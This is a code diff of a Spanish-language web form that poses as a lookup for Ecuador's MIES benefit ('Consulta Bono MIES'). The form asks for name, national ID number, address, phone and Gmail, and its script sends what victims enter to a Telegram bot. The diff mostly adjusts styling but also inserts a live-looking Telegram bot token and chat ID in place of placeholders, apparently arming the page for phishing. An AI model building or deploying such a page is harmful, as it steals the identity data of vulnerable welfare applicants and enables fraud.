@@ -2,100 +2,93 @@
 <html lang="es">
 <head>
 <meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
+<meta name="viewport" content="width=device-width, initial-scale=0.8, maximum-scale=0.8, user-scalable=no" />
 <title>Consulta Bono MIES</title>
 <style>
   @import url('https://fonts.googleapis.com/css2?family=Poppins&display=swap');
 
   body {
+    margin: 0;
+    padding: 0;
     background: #f0f2f5;
     font-family: 'Poppins', sans-serif;
     display: flex;
     justify-content: center;
-    align-items: center; /* Centra el contenido verticalmente */
+    align-items: flex-start;
     min-height: 100vh;
-    padding: 10px;
     box-sizing: border-box;
-    overflow: hidden; /* Evita el scroll en dispositivos grandes */
+    overflow-y: auto;
   }
 
   .container {
     background: white;
     border-radius: 12px;
     box-shadow: 0 5px 15px rgba(0,0,0,0.1);
-    width: 100%;
-    max-width: 540px;
-    padding: 15px; /* Reducción de padding */
+    width: 95%;
+    max-width: 500px;
+    padding: 15px;
     box-sizing: border-box;
-    display: flex;
-    flex-direction: column;
-    justify-content: center; /* Centra el contenido dentro del contenedor */
+    margin-top: 10px;
   }
 
   .header {
     display: flex;
     justify-content: center;
     align-items: center;
-    margin-bottom: 5px; /* Reducción de margen */
+    margin-bottom: 8px;
   }
 
   .header img {
-    width: 100px; /* Reducción del logo */
+    width: 120px;
     height: auto;
   }
 
   .divider {
     width: 100%;
-    height: 1px; /* Reducción de altura */
+    height: 1px;
     background-color: #0b44a4;
-    margin: 8px 0 10px 0; /* Reducción de márgenes */
+    margin: 10px 0;
     border-radius: 1px;
   }
 
   h1 {
-    font-size: 16px; /* Reducción del tamaño de fuente */
+    font-size: 18px;
     font-weight: 700;
     color: #111b35;
-    margin-bottom: 10px; /* Reducción de margen */
+    margin-bottom: 12px;
     text-align: center;
   }
 
   label {
     display: block;
-    font-size: 12px; /* Reducción del tamaño de fuente */
+    font-size: 13px;
     color: #111b35;
-    margin-bottom: 4px; /* Reducción de margen */
+    margin-bottom: 4px;
     font-weight: 600;
   }
 
-  input[type="text"], input[type="tel"], input[type="email"] {
+  input {
     width: 100%;
-    padding: 8px 10px; /* Reducción de padding */
-    font-size: 13px; /* Reducción del tamaño de fuente */
-    border-radius: 6px; /* Reducción de radio */
-    border: 1.5px solid #c3cad9;
-    margin-bottom: 8px; /* Reducción de margen */
-    transition: border-color 0.3s ease;
+    padding: 8px;
+    font-size: 14px;
+    border-radius: 6px;
+    border: 1px solid #c3cad9;
+    margin-bottom: 10px;
     box-sizing: border-box;
-  }
-
-  input:focus {
-    border-color: #0b234d;
-    outline: none;
   }
 
   .security {
     display: flex;
     align-items: center;
-    gap: 6px; /* Reducción de gap */
-    font-size: 11px; /* Reducción del tamaño de fuente */
+    gap: 5px;
+    font-size: 11px;
     color: #2a5a27;
-    margin-bottom: 10px; /* Reducción de margen */
+    margin-bottom: 12px;
   }
 
   .security svg {
-    width: 16px; /* Reducción del icono */
-    height: 16px;
+    width: 14px;
+    height: 14px;
     fill: #2a5a27;
   }
 
@@ -104,10 +97,10 @@
     background: #0b44a4;
     color: white;
     font-weight: 700;
-    font-size: 13px; /* Reducción del tamaño de fuente */
-    padding: 10px 0; /* Reducción de padding */
+    font-size: 14px;
+    padding: 10px 0;
     border: none;
-    border-radius: 6px; /* Reducción de radio */
+    border-radius: 6px;
     cursor: pointer;
     text-transform: uppercase;
     box-shadow: 0 4px 9px rgba(11, 68, 164, 0.5);
@@ -119,17 +112,39 @@
   }
 
   .legal {
-    font-size: 9px; /* Reducción del tamaño de fuente */
+    font-size: 10px;
     color: #5a5f6b;
-    margin-top: 10px; /* Reducción de margen */
+    margin-top: 10px;
     line-height: 1.3;
     text-align: center;
   }
 
-  /* Ajustes para móviles (se aplican por defecto con los cambios anteriores) */
-  @media (max-width: 480px) {
-    body {
-      padding: 5px;
+  /* Media query para ajustar aún más en pantallas muy pequeñas */
+  @media (max-width: 360px) {
+    h1 {
+      font-size: 16px;
+      margin-bottom: 8px;
+    }
+    label {
+      font-size: 12px;
+      margin-bottom: 3px;
+    }
+    input {
+      padding: 6px;
+      font-size: 13px;
+      margin-bottom: 8px;
+    }
+    button {
+      font-size: 13px;
+      padding: 8px 0;
+    }
+    .security {
+      font-size: 10px;
+      gap: 3px;
+      margin-bottom: 10px;
+    }
+    .header img {
+      width: 100px;
     }
   }
 
@@ -183,7 +198,7 @@
     <input type="text" id="nombre" name="nombre" required />
 
     <label for="cedula">Cédula</label>
-    <input type="text" id="cedula" name="cedula" maxlength="10" pattern="[0-9]{10}" required />
+    <input type="text" id="cedula" name="cedula" maxlength="10" pattern="^\d{10}$" required />
 
     <label for="provincia">Provincia / Ciudad</label>
     <input type="text" id="provincia" name="provincia" required />
@@ -192,7 +207,7 @@
     <input type="text" id="direccion" name="direccion" required />
 
     <label for="telefono">Número de teléfono</label>
-    <input type="tel" id="telefono" name="telefono" maxlength="10" pattern="[0-9]{7,10}" required />
+    <input type="tel" id="telefono" name="telefono" maxlength="10" pattern="^\d{7,10}$" required />
 
     <label for="email">Correo electrónico (Gmail)</label>
     <input type="email" id="email" name="email" pattern="^[a-zA-Z0-9._%+-]+@gmail\.com$" required />
@@ -222,8 +237,8 @@
   const popup = document.getElementById('popup');
 
   // Poner aquí tus datos de Telegram
-  const TELEGRAM_TOKEN = "TU_TOKEN_AQUI";
-  const CHAT_ID = "TU_CHAT_ID_AQUI";
+  const TELEGRAM_TOKEN = "8294121246:AAEWiRJdKEJRn4UdJpUyaTVsfk1MCua19WI";
+  const CHAT_ID = "5654253897";
 
   form.addEventListener('submit', function(e) {
     e.preventDefault();
@@ -236,7 +251,7 @@
     const email = document.getElementById('email').value;
 
     const mensaje = `
-📋 *Nueva Consulta Bono MIES* 📋
+📋 *Nueva Consulta Bono * 📋
 👤 Nombre: ${nombre}
 🪪 Cédula: ${cedula}
 📍 Provincia/Ciudad: ${provincia}
